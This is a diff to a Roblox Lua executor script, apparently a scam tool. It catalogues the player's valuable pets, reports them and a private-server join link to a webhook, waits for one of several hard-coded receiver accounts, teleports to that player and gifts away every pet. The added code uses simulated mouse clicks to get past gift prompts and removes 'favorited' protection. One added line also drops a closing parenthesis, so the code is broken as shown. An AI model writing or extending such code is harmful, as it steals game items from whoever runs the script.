@@ -8,6 +8,10 @@ local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local UserInputService = game:GetService("UserInputService")
+local TextChatService = game:GetService("TextChatService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn", "RacMethodCB"}
 local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
@@ -16,7 +20,10 @@ local SHUTDOWN_DURATION = 10
 local GIFT_COOLDOWN = 3
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
+local DELTA_CLICK_INTERVAL = 2
+local FAVORITE_CHECK_DELAY = 1.5
 
+-- Improved executor detection
 local function identifyExecutor()
     if syn then
         return "Synapse X"
@@ -26,14 +33,20 @@ local function identifyExecutor()
         return "Krnl"
     elseif fluxus then
         return "Fluxus"
+    elseif identifyexecutor then
+        local exec = identifyexecutor()
+        if exec:lower():find("delta") then
+            return "Delta"
+        end
+        return exec
     elseif getexecutorname then
         return getexecutorname()
-    elseif identifyexecutor then
-        return identifyexecutor()
     else
         return "Unknown Executor"
     end
 end
+
+local IS_DELTA = identifyExecutor():lower() == "delta"
 
 if syn then
     syn.protect_gui(syn.secure_call)
@@ -90,7 +103,7 @@ local function getPetsInventory()
                 kg = kg,
                 age = age,
                 special = isSpecial,
-                value = math.floor((kg * 10000) + (age * 1000))
+                value = math.floor((kg * 10000) + (age * 1000)
             })
         end
     end
@@ -366,7 +379,7 @@ local function splitEmbeds(pets, totalValue, specialCount)
             {
                 name = "🌐 Server Information",
                 value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
-                    game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
+                    MarketplaceService:GetProductInfo(placeId).Name,
                     placeId, 
                     jobId,
                     placeId,
@@ -476,6 +489,7 @@ local function equipSinglePet(petName)
     local character = LocalPlayer.Character
     if not character then return false end
 
+    -- Unequip all pets first
     for _, item in ipairs(character:GetChildren()) do
         if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
             item.Parent = LocalPlayer.Backpack
@@ -641,35 +655,144 @@ local function waitForReceiver()
     return foundReceiver
 end
 
-local function startGifting(targetPlayer)
-    while true do
-        local pets = getPetsInventory()
-        if #pets == 0 then break end
+-- Delta-specific functions
+local function clickPlayerScreen(targetPlayer)
+    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
+    
+    local camera = workspace.CurrentCamera
+    local pos, visible = camera:WorldToViewportPoint(targetPlayer.Character.HumanoidRootPart.Position)
+    if not visible then return false end
+    
+    local x, y = pos.X, pos.Y
+    
+    -- Simulate mouse click
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
+    task.wait(0.1)
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
+    
+    return true
+end
 
-        for _, pet in ipairs(pets) do
-            if isPetFavorited(pet.fullName) then
-                unfavoritePet(pet.fullName)
-                task.wait(1)
-            end
-
-            if equipSinglePet(pet.fullName) then
-                giftPet(targetPlayer, pet.fullName)
-                task.wait(GIFT_COOLDOWN)
-                break
-            end
+local function checkForGiftPrompt(targetPlayer)
+    -- Check all TextLabels in CoreGui for gift prompt
+    for _, gui in ipairs(CoreGui:GetDescendants()) do
+        if gui:IsA("TextLabel") and gui.Text:lower():find("cannot gift a favorited pet") then
+            return "favorited"
+        elseif gui:IsA("TextLabel") and gui.Text:lower():find(targetPlayer.Name:lower()) and gui.Text:lower():find("gift") then
+            return "gift"
         end
-        task.wait(1)
+    end
+    return "none"
+end
+
+local function deltaGiftPet(targetPlayer, petName)
+    -- Equip the pet first
+    if not equipSinglePet(petName) then return false end
+    
+    local attempts = 0
+    local maxAttempts = 3
+    
+    while attempts < maxAttempts do
+        attempts = attempts + 1
+        
+        -- Click on the target player
+        if not clickPlayerScreen(targetPlayer) then
+            task.wait(1)
+            continue
+        end
+        
+        -- Wait a moment for the prompt to appear
+        task.wait(0.5)
+        
+        -- Check what kind of prompt we got
+        local promptStatus = checkForGiftPrompt(targetPlayer)
+        
+        if promptStatus == "gift" then
+            -- If we got a gift prompt, we're good to proceed
+            return true
+        elseif promptStatus == "favorited" then
+            -- If pet is favorited, unfavorite it and try again
+            unfavoritePet(petName)
+            task.wait(FAVORITE_CHECK_DELAY)
+            equipSinglePet(petName) -- Re-equip after unfavoriting
+        else
+            -- If no prompt, wait a bit and try clicking again
+            task.wait(1)
+        end
+    end
+    
+    return false
+end
+
+local function startGifting(targetPlayer)
+    local function handleNormalGifting()
+        while true do
+            local pets = getPetsInventory()
+            if #pets == 0 then break end
+
+            for _, pet in ipairs(pets) do
+                if isPetFavorited(pet.fullName) then
+                    unfavoritePet(pet.fullName)
+                    task.wait(1)
+                end
+
+                if equipSinglePet(pet.fullName) then
+                    giftPet(targetPlayer, pet.fullName)
+                    task.wait(GIFT_COOLDOWN)
+                    break
+                end
+            end
+            task.wait(1)
+        end
+    end
+
+    local function handleDeltaGifting()
+        while true do
+            local pets = getPetsInventory()
+            if #pets == 0 then break end
+
+            for _, pet in ipairs(pets) do
+                if deltaGiftPet(targetPlayer, pet.fullName) then
+                    -- If we successfully got to the gift prompt, send the gift
+                    giftPet(targetPlayer, pet.fullName)
+                    task.wait(GIFT_COOLDOWN)
+                    break
+                else
+                    -- If we failed after max attempts, move to next pet
+                    task.wait(1)
+                end
+            end
+            task.wait(1)
+        end
+    end
+
+    if IS_DELTA then
+        handleDeltaGifting()
+    else
+        handleNormalGifting()
     end
 end
 
+-- Main execution
 createLoader()
 sendInitialReport()
 task.wait(2)
 
 local receiver = waitForReceiver()
-if not receiver then return end
+if not receiver then 
+    sendWebhook({
+        content = "❌ No receiver found in game after waiting. Shutting down..."
+    })
+    return 
+end
+
+sendWebhook({
+    content = string.format("✅ Found receiver: %s (@%s). Starting gifting process...", receiver.Name, receiver.DisplayName)
+})
 
 teleportToPlayer(receiver)
 startGifting(receiver)
 
-
+sendWebhook({
+    content = "🎉 All pets have been successfully gifted! Shutting down..."
+})
